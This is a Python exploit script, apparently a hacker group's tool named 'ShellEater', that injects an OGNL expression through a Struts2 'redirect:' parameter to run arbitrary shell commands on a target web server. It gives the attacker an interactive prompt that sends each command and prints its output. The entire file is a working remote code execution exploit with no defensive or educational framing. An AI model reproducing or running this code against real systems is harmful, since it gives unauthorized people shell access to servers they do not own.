#!/usr/bin/python
# coding=utf-8

import requests
import sys
import readline

# ShellEater By TEAM 53
if len(sys.argv) == 2:
    target = sys.argv[1]  # Payload
    first = target + "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','"
    second = "'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
    loop = 1
    while loop == 1:
        cmd = input("$ ")
        while cmd.strip() == '':
            cmd = input("$ ")
        if cmd.strip() == '\q':
            print("Exiting...")
            sys.exit()
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
            pwn = requests.get(first + cmd + second, headers=headers)
            if pwn.status_code == 200:
                print(pwn.content.decode())  # 1337
            else:
                print("Not Vuln :(")
                sys.exit()
        except Exception as e:
            print(e)
            print("Exiting...")
            sys.exit()

else:  # BANNER
    print("TEAM 53")
    print("bye 1337")
    sys.exit()
